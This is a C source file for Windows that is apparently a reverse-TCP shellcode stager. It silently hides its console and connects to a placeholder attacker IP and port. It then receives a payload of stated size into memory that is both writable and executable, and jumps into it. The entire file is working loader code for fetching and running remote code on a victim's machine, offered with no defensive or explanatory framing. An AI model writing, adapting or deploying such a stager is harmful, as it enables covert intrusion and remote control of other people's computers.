#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>

char reverse_ip[] = "AAA.AAA.AAA.AAA";
char reverse_port[] = "AAAAA";
ULONG32 use_xor = 4242;

int main(int argc, char * argv[]) {
    int recv_b = 0;
	ULONG32 stage_size = 0;
	char * stage;
	void (*stage_main)();
    WSADATA wsaData;
	
	FreeConsole();

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) 
	{
	    //printf("wsastartup\n");
        return 1;
	}
    else
    {
        SOCKET s;
        
        s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET)
		{
			//printf("socket\n");
            return 1;
		}
        else
        {
            SOCKADDR_IN srv_addr;
            
            srv_addr.sin_family       = AF_INET;
            srv_addr.sin_addr.s_addr  = inet_addr(reverse_ip);
            srv_addr.sin_port         = htons(atoi(reverse_port));
            memset(&srv_addr.sin_zero, '\0', sizeof(srv_addr.sin_zero));
            
            if (connect(s, (SOCKADDR *)&srv_addr, sizeof(srv_addr)) == SOCKET_ERROR)
			{
				//printf("connect\n");
                return 1;
			}
            else
            {
                recv_b = recv(s, (char *)&stage_size, 4, 0);
				if (recv_b != 4 || stage_size <= 0)
				{
				    //printf("recv_size\n");
					return 1;
				}
                stage = VirtualAlloc(0, stage_size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				if (stage == NULL)
				{
					//printf("virtualalloc\n");
				    return 1;
				}
					
				stage[0] = 0xBF;
				memcpy(stage + 1, &s, 4);
				
				{
					int recv_tmp = 0, recv_tot = 0;
					char *stage_index = stage + 5;
					
					while (recv_tot < stage_size) {
						recv_tmp = recv(s, stage_index, stage_size - recv_tot, 0);
						if (recv_tmp == SOCKET_ERROR)
						{
							//printf("recv\n");
							return 1;
						}
						recv_tot += recv_tmp;
						stage_index += recv_tmp;
					}
				}
				
				stage_main = (void (*)())stage;
				stage_main();
                      
            }
            
        }
    }
    
    return 0;
}
